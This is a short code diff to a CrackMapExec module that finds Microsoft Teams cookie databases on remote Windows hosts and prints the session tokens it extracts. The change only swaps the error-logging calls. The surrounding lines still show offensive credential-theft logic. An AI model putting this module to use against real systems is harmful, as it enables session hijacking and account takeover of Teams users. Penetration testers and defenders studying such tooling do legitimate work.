@@ -36,7 +36,7 @@ class CMEModule:
                     if 'STATUS_SHARING_VIOLATION' in str(e):
                         context.log.debug(str(e))
                         context.log.highlight("Found Cookie file in path " + path)
-                        context.log.error('Cannot retrieve file, most likely Teams is running which prevents us from retrieving the Cookies database')
+                        context.log.fail('Cannot retrieve file, most likely Teams is running which prevents us from retrieving the Cookies database')
         if found == 0:
             context.log.display('No cookie file found in Users folder')
 
@@ -48,10 +48,10 @@ class CMEModule:
             c.execute("SELECT value FROM cookies WHERE name = '" + name + "'")
             row = c.fetchone()
             if row is None:
-                context.log.error("No " + name + " present in Microsoft Teams Cookies database")
+                context.log.fail("No " + name + " present in Microsoft Teams Cookies database")
             else:
                 context.log.success("Succesfully extracted " + name + ": ")
                 context.log.success(row[0])
             conn.close()
         except Exception as e:
-            context.log.error(str(e))
+            context.log.fail(str(e))
